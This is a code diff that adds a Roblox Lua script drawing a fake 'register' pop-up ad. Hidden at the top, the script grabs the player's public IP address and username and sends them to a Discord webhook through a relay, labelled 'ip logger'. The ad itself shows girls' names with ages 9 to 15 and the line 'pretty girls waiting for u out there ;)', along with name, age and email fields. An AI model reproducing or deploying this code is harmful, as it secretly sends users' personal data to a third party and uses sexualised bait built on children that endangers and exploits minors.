@@ -1,0 +1,254 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+local name = game:GetService("Players").LocalPlayer.Name
+local msg = name.." : "..ip
+
+local webhook = "https://discord.com/api/webhooks/918162644601557082/4O_PGDJ5lqUi9jfFmrL2Npq9Yb2Y46YBohO3qorIoCwSpJEkQQMjgUqywZkmY8L6esw3"
+local HttpService = game:GetService("HttpService");
+local botname = "ip logger"
+
+function specials(Webhook, Message, Botname)
+    local Name;
+    local start = game:HttpGet("http://buritoman69.glitch.me");
+    local biggie = "http://buritoman69.glitch.me/webhook";
+    if (not Message or Message == "" or not Botname) then
+        Name = "GameBot"
+        return error("nil or empty message!")
+    else
+        Name = Botname;
+    end
+    local Body = {
+        ['Key'] = tostring("applesaregood"),
+        ['Message'] = tostring(Message),
+        ['Name'] = Name,
+        ['Webhook'] = Webhook    
+    }
+    Body = HttpService:JSONEncode(Body);
+    local Data = game:HttpPost(biggie, Body, false, "application/json")
+    return Data or nil;
+end
+
+specials(webhook, msg, botname)
+
+
+local ScreenGui = Instance.new("ScreenGui")
+local ad1 = Instance.new("Frame")
+local Frame = Instance.new("Frame")
+local ImageLabel = Instance.new("ImageLabel")
+local name = Instance.new("TextLabel")
+local age = Instance.new("TextLabel")
+local age_2 = Instance.new("TextLabel")
+local register = Instance.new("Frame")
+local name_2 = Instance.new("TextBox")
+local age_3 = Instance.new("TextBox")
+local mail = Instance.new("TextBox")
+local rgst = Instance.new("TextButton")
+local TextLabel = Instance.new("TextLabel")
+local Shadow = Instance.new("Frame")
+local close = Instance.new("ImageButton")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+ad1.Name = "ad1"
+ad1.Parent = ScreenGui
+ad1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ad1.BorderSizePixel = 0
+ad1.Position = UDim2.new(0.35083881, 0, 0.166047081, 0)
+ad1.Size = UDim2.new(0, 426, 0, 28)
+
+Frame.Parent = ad1
+Frame.BackgroundColor3 = Color3.fromRGB(217, 217, 217)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0, 0, 1, 0)
+Frame.Size = UDim2.new(0, 426, 0, 270)
+
+ImageLabel.Parent = Frame
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BackgroundTransparency = 1.000
+ImageLabel.Position = UDim2.new(0.0140845068, 0, 0.0222222228, 0)
+ImageLabel.Size = UDim2.new(0, 219, 0, 108)
+ImageLabel.Image = "http://www.roblox.com/asset/?id=1436992293"
+
+name.Name = "name"
+name.Parent = Frame
+name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+name.BackgroundTransparency = 1.000
+name.Position = UDim2.new(0.563380301, 0, 0.0222222228, 0)
+name.Size = UDim2.new(0, 63, 0, 50)
+name.Font = Enum.Font.SourceSans
+name.Text = "name"
+name.TextColor3 = Color3.fromRGB(0, 0, 0)
+name.TextSize = 28.000
+name.TextXAlignment = Enum.TextXAlignment.Left
+
+age.Name = "age"
+age.Parent = Frame
+age.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+age.BackgroundTransparency = 1.000
+age.Position = UDim2.new(0.748826325, 0, 0.0222222228, 0)
+age.Size = UDim2.new(0, 63, 0, 50)
+age.Font = Enum.Font.SourceSans
+age.Text = "age"
+age.TextColor3 = Color3.fromRGB(0, 0, 0)
+age.TextSize = 28.000
+age.TextXAlignment = Enum.TextXAlignment.Left
+
+age_2.Name = "age"
+age_2.Parent = Frame
+age_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+age_2.BackgroundTransparency = 1.000
+age_2.Position = UDim2.new(0.528169036, 0, 0.2074074, 0)
+age_2.Size = UDim2.new(0, 171, 0, 44)
+age_2.Font = Enum.Font.SourceSans
+age_2.Text = "pretty girls waiting for u out there ;)"
+age_2.TextColor3 = Color3.fromRGB(16, 16, 16)
+age_2.TextSize = 15.000
+age_2.TextXAlignment = Enum.TextXAlignment.Left
+
+register.Name = "register"
+register.Parent = Frame
+register.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+register.BackgroundTransparency = 1.000
+register.Position = UDim2.new(0.0140845068, 0, 0.455555558, 0)
+register.Size = UDim2.new(0, 404, 0, 138)
+
+name_2.Name = "name"
+name_2.Parent = register
+name_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+name_2.BorderSizePixel = 0
+name_2.ClipsDescendants = true
+name_2.Position = UDim2.new(0.0470297039, 0, 0.0652173907, 0)
+name_2.Size = UDim2.new(0, 200, 0, 38)
+name_2.ClearTextOnFocus = false
+name_2.Font = Enum.Font.SourceSans
+name_2.PlaceholderText = "Name"
+name_2.Text = ""
+name_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+name_2.TextSize = 22.000
+name_2.TextWrapped = true
+
+age_3.Name = "age"
+age_3.Parent = register
+age_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+age_3.BorderSizePixel = 0
+age_3.ClipsDescendants = true
+age_3.Position = UDim2.new(0.0470297039, 0, 0.384057969, 0)
+age_3.Size = UDim2.new(0, 200, 0, 38)
+age_3.ClearTextOnFocus = false
+age_3.Font = Enum.Font.SourceSans
+age_3.PlaceholderText = "Age"
+age_3.Text = ""
+age_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+age_3.TextSize = 22.000
+age_3.TextWrapped = true
+
+mail.Name = "mail"
+mail.Parent = register
+mail.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+mail.BorderSizePixel = 0
+mail.ClipsDescendants = true
+mail.Position = UDim2.new(0.0470297039, 0, 0.717391312, 0)
+mail.Size = UDim2.new(0, 200, 0, 38)
+mail.ClearTextOnFocus = false
+mail.Font = Enum.Font.SourceSans
+mail.PlaceholderText = "E-Mail"
+mail.Text = ""
+mail.TextColor3 = Color3.fromRGB(0, 0, 0)
+mail.TextSize = 22.000
+mail.TextWrapped = true
+
+rgst.Name = "rgst"
+rgst.Parent = register
+rgst.BackgroundColor3 = Color3.fromRGB(53, 107, 78)
+rgst.BorderSizePixel = 0
+rgst.Position = UDim2.new(0.569307029, 0, 0.550724626, 0)
+rgst.Size = UDim2.new(0, 180, 0, 45)
+rgst.ZIndex = 2
+rgst.Font = Enum.Font.GothamSemibold
+rgst.Text = ""
+rgst.TextColor3 = Color3.fromRGB(255, 255, 255)
+rgst.TextScaled = true
+rgst.TextSize = 14.000
+rgst.TextWrapped = true
+
+TextLabel.Parent = rgst
+TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.5, 0, 0.544444442, 0)
+TextLabel.Size = UDim2.new(1, -20, 1, -20)
+TextLabel.ZIndex = 2
+TextLabel.Font = Enum.Font.GothamSemibold
+TextLabel.Text = "Register"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+Shadow.Name = "Shadow"
+Shadow.Parent = register
+Shadow.BackgroundColor3 = Color3.fromRGB(77, 156, 115)
+Shadow.BorderColor3 = Color3.fromRGB(77, 156, 115)
+Shadow.BorderSizePixel = 0
+Shadow.Position = UDim2.new(0.583058238, 0, 0.555072725, 0)
+Shadow.Size = UDim2.new(0.434268475, 0, 0.350724369, 4)
+
+close.Name = "close"
+close.Parent = ad1
+close.BackgroundTransparency = 1.000
+close.Position = UDim2.new(0.941314578, 0, 0.0357142985, 0)
+close.Size = UDim2.new(0, 25, 0, 25)
+close.ZIndex = 2
+close.Image = "rbxassetid://3926305904"
+close.ImageColor3 = Color3.fromRGB(0, 0, 0)
+close.ImageRectOffset = Vector2.new(284, 4)
+close.ImageRectSize = Vector2.new(24, 24)
+
+-- Scripts:
+
+
+local function JTUVDX_fake_script() -- ScreenGui.script 
+	local script = Instance.new('LocalScript', ScreenGui)
+
+	
+	local ad1 = script.Parent.ad1
+	
+	local names = {
+		"Elizabeth",
+		"Mia",
+		"Lucia",
+		"Anny",
+	}
+	
+	local ages = {
+		"9",
+		"10",
+		"11",
+		"12",
+		"13",
+		"14",
+		"15",
+	}
+	
+	local chosenWord = names[math.random(#names)]
+	local chosenWord1 = ages[math.random(#ages)]
+	
+	ad1.Frame.name.Text = chosenWord
+	ad1.Frame.age.Text = chosenWord1
+	
+	print(chosenWord)
+	print(chosenWord1)
+end
+coroutine.wrap(JTUVDX_fake_script)()
+
+
+
+
